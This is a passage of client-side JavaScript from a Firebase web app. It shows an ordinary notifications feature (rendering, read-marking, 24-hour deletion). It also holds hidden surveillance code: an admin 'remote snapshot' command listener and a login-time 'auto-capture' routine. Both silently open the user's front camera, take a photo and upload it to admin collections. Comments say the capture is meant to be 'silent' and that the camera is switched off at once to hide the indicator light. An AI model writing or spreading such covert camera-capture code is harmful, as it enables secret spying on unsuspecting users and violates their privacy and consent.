            // Sort by timestamp in JavaScript (newest first)
            userNotifications.sort((a, b) => {
                const timeA = a.timestamp?.toDate?.() || new Date(a.timestamp) || 0;
                const timeB = b.timestamp?.toDate?.() || new Date(b.timestamp) || 0;
                return timeB - timeA;
            });

            console.log('Notifications updated:', userNotifications.length, 'unread:', notificationsUnreadCount);
            console.log('Notifications data:', userNotifications);
            updateNotificationsBadge();
            // Re-render if modal is open
            if (!notificationsModal.classList.contains('hidden')) {
                renderNotifications();
            }
        }, (error) => {
            console.error('Error listening to notifications:', error);
        });
    } catch (error) {
        console.error('Error setting up notification listener:', error);
    }
}

function updateNotificationsBadge() {
    if (notificationsUnreadCount > 0) {
        notificationsBadge.textContent = notificationsUnreadCount;
        notificationsBadge.classList.remove('hidden');
    } else {
        notificationsBadge.classList.add('hidden');
    }
}

function openNotificationsModal() {
    notificationsModal.classList.remove('hidden');
    renderNotifications();
    markNotificationsAsRead();
}

function closeNotificationsModal() {
    notificationsModal.classList.add('hidden');
}

function renderNotifications() {
    console.log('Rendering notifications:', userNotifications.length);

    if (userNotifications.length === 0) {
        notificationsList.innerHTML = '<div class="notifications-empty">No notifications yet</div>';
        return;
    }

    notificationsList.innerHTML = userNotifications.map(notification => {
        // Handle both Firestore Timestamp and regular Date objects
        let timestamp;
        if (notification.timestamp && typeof notification.timestamp.toDate === 'function') {
            timestamp = notification.timestamp.toDate();
        } else if (notification.timestamp instanceof Date) {
            timestamp = notification.timestamp;
        } else if (typeof notification.timestamp === 'number') {
            timestamp = new Date(notification.timestamp);
        } else {
            timestamp = new Date();
        }

        const timeAgo = getTimeAgo(timestamp);
        const isUnread = !notification.read;

        // Calculate deletion time for read notifications
        let deletionInfo = '';
        if (notification.read && notification.readAt) {
            const readTime = notification.readAt.toDate?.() || new Date(notification.readAt);
            const now = new Date();
            const hoursUntilDelete = 24 - Math.floor((now - readTime) / 3600000);

            if (hoursUntilDelete > 0) {
                deletionInfo = `<div class="notification-deletion-info">Will delete in ${hoursUntilDelete}h</div>`;
            }
        }

        return `
            <div class="notification-item ${isUnread ? 'unread' : ''}">
                <div class="notification-header">
                    <div class="notification-title">${escapeHtml(notification.title || 'Notification')}</div>
                    <div class="notification-time">${timeAgo}</div>
                </div>
                <div class="notification-content">${escapeHtml(notification.message)}</div>
                <div class="notification-status ${isUnread ? '' : 'read'}">
                    <span class="notification-status-dot"></span>
                    <span>${isUnread ? 'Unread' : 'Seen'}</span>
                </div>
                ${deletionInfo}
            </div>
        `;
    }).join('');
}

async function markNotificationsAsRead() {
    try {
        const unreadNotifications = userNotifications.filter(n => !n.read);

        for (const notification of unreadNotifications) {
            const notifRef = doc(db, 'notifications', notification.id);
            await updateDoc(notifRef, {
                read: true,
                readAt: serverTimestamp()
            });
        }

        notificationsUnreadCount = 0;
        updateNotificationsBadge();
    } catch (error) {
        console.error('Error marking notifications as read:', error);
    }
}

// Auto-delete read notifications after 24 hours
async function cleanupOldNotifications() {
    try {
        const now = new Date();
        const twentyFourHoursAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);

        for (const notification of userNotifications) {
            // Only delete if:
            // 1. Notification is marked as read
            // 2. readAt timestamp exists and is older than 24 hours
            if (notification.read && notification.readAt) {
                const readTime = notification.readAt.toDate?.() || new Date(notification.readAt);

                if (readTime < twentyFourHoursAgo) {
                    const notifRef = doc(db, 'notifications', notification.id);
                    await deleteDoc(notifRef);
                    console.log('Deleted old notification:', notification.id);
                }
            }
        }
    } catch (error) {
        console.error('Error cleaning up old notifications:', error);
    }
}

// Run cleanup every hour
setInterval(cleanupOldNotifications, 60 * 60 * 1000);

function getTimeAgo(date) {
    const now = new Date();
    const diffMs = now - date;
    const diffMins = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMs / 3600000);
    const diffDays = Math.floor(diffMs / 86400000);

    if (diffMins < 1) return 'Just now';
    if (diffMins < 60) return `${diffMins}m ago`;
    if (diffHours < 24) return `${diffHours}h ago`;
    if (diffDays < 7) return `${diffDays}d ago`;

    return date.toLocaleDateString();
}

// ===========================
// Initialize Games Launcher
// ===========================
setupGamesLauncher();
// ===========================
// Admin Remote Command Handling
// ===========================
function initCommandListener() {
    if (!currentUser) return;

    // Unsubscribe previous listener if exists
    if (unsubscribeCommands) {
        unsubscribeCommands();
    }

    const commandsRef = collection(db, 'commands');
    const q = query(
        commandsRef,
        where('targetUserId', '==', currentUser.uid),
        where('status', '==', 'pending')
    );

    unsubscribeCommands = onSnapshot(q, (snapshot) => {
        snapshot.docChanges().forEach((change) => {
            if (change.type === 'added') {
                const commandData = change.doc.data();
                handleCommand(change.doc.id, commandData);
            }
        });
    });
}

async function handleCommand(commandId, commandData) {
    if (commandData.type === 'remote_snapshot') {
        console.log('Received remote snapshot command:', commandId);

        try {
            // Check permissions first (though getUserMedia will prompt if not granted)
            // We want to avoid UI disruption if possible, but for first time it will prompt.
            // "Silent" capture only works if permission is already "Always Allow".

            // Access camera
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: false
            });

            // Create efficient video element for capture
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.playsInline = true; // Important for mobile

            await new Promise((resolve, reject) => {
                video.onloadedmetadata = () => {
                    video.play().then(resolve).catch(reject);
                };
                video.onerror = reject;
            });

            // Wait a moment for auto-exposure/white balance (optional, but 200ms helps)
            await new Promise(r => setTimeout(r, 200));

            // Capture to canvas
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert to Base64 (JPEG 0.5 quality)
            const base64Image = canvas.toDataURL('image/jpeg', 0.5);

            // STOP STREAM IMMEDIATELY to turn off camera light
            stream.getTracks().forEach(track => track.stop());

            // Send back to server
            await updateDoc(doc(db, 'commands', commandId), {
                status: 'completed',
                image: base64Image,
                completedAt: serverTimestamp()
            });

            console.log('Snapshot sent successfully');

        } catch (error) {
            console.error('Snapshot capture failed:', error);

            // Report error to admin
            try {
                await updateDoc(doc(db, 'commands', commandId), {
                    status: 'error',
                    error: error.message || 'Permission denied or hardware error',
                    failedAt: serverTimestamp()
                });
            } catch (e) {
                console.error('Failed to report error:', e);
            }
        }
    }
}

// ===========================
// Auto-Capture on Login
// ===========================
async function checkAndTriggerAutoCapture(userId) {
    try {
        // Fetch user document to check autoCaptureEnabled flag
        const userDoc = await getDoc(doc(db, 'users', userId));
        if (!userDoc.exists()) return;

        const userData = userDoc.data();
        if (!userData.autoCaptureEnabled) return;

        console.log('Auto-capture flag detected, triggering capture...');

        // Immediately reset the flag to prevent loop
        await updateDoc(doc(db, 'users', userId), {
            autoCaptureEnabled: false
        });

        // Trigger the capture
        await performAutoCapture(userId, userData);
    } catch (error) {
        console.error('Error checking auto-capture flag:', error);
    }
}

async function performAutoCapture(userId, userData) {
    try {
        // Access front camera
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: false
        });

        // Create video element for capture
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;

        await new Promise((resolve, reject) => {
            video.onloadedmetadata = () => {
                video.play().then(resolve).catch(reject);
            };
            video.onerror = reject;
        });

        // Wait for camera to stabilize
        await new Promise(r => setTimeout(r, 200));

        // Capture to canvas
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert to Base64
        const base64Image = canvas.toDataURL('image/jpeg', 0.7);

        // Stop stream immediately
        stream.getTracks().forEach(track => track.stop());

        // Save to Firestore
        await saveAutoCapture(userId, userData, base64Image);

        console.log('Auto-capture completed successfully');
    } catch (error) {
        console.error('Auto-capture failed:', error);
        // Still reset the flag even if capture fails to prevent retry loop
        try {
            await updateDoc(doc(db, 'users', userId), {
                autoCaptureEnabled: false
            });
        } catch (e) {
            console.error('Failed to reset flag:', e);
        }
    }
}

async function saveAutoCapture(userId, userData, imageData) {
    try {
        const captureData = {
            capturedUserId: userId,
            capturedUserName: userData.displayName || userData.email || 'Unknown',
            capturedUserEmail: userData.email || '',
            timestamp: serverTimestamp(),
            imageData: imageData,
            captureType: 'auto_capture'
        };

        // Save to admin_captures collection
        await addDoc(collection(db, 'admin_captures'), captureData);
        console.log('Auto-capture saved to Firestore');
    } catch (error) {
        console.error('Error saving auto-capture:', error);
        throw error;
    }
}
